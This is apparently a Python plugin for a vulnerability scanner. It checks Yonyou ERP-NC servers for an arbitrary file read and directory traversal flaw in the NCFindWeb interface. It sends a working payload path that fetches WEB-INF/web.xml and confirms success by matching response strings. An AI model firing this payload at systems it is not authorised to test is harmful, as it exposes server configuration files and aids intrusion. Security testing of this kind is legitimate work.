#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
用友ERP-NC NCFindWeb接口任意文件读取/下载/目录遍历
    暂无编号

用友ERP-NC NCFindWeb接口任意文件读取/下载漏洞
    也可以目录遍历
'''

from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {'path': 'NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'},
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')

        vul_info = {
            'app_name': 'Yonyou-ERP-NC',
            'vul_type': 'FileRead',
            'vul_id': 'NC-fileRead',
        }

        for payload in self.payloads:
            path = payload['path']
            
            res = client.request(
                'get',
                path,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (('nc.bs.framework.server' in res.text) or ('WebApplicationStartupHook' in res.text)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['vul_type'], vul_info['app_name'], vul_info['vul_id']],
                    'Request': res,
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
